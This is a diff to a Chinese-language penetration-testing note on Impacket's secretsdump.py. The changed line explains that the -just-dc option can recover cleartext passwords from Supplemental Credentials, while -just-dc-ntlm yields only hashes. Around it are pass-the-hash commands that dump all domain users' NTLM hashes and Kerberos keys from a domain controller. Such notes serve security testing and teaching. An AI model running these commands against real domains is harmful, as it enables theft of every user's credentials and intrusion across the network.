@@ -113,7 +113,7 @@ secretsdump.py主要从SAM、LSA secrets(包括 cached creds)和域控的NTDS.di
 ```
 python secretsdump.py domain/username@10.10.10.10 -hashes LM HASH:NT HASH  -just-dc-ntlm -outputfile tmp
 ```
-2、导出域内所有用户的ntlm hash、Kerberos keys和Domain Credentials(Supplemental Credentials，可能保存有明文密码，secretsdump生成的文件以cleartext为后缀)。  
+2、导出域内所有用户的ntlm hash、Kerberos keys和Domain Credentials(Supplemental Credentials，可能保存有明文密码，secretsdump生成的文件以cleartext为后缀)。-just-dc能导出用户明文密码(如果明文保存在Supplemental Credentials的话，-just-dc-ntlm只能导出lm hash和nt hash)  
 ```
 python secretsdump.py domain/username@10.10.10.10 -hashes LM HASH:NT HASH  -just-dc -outputfile tmp
 ```
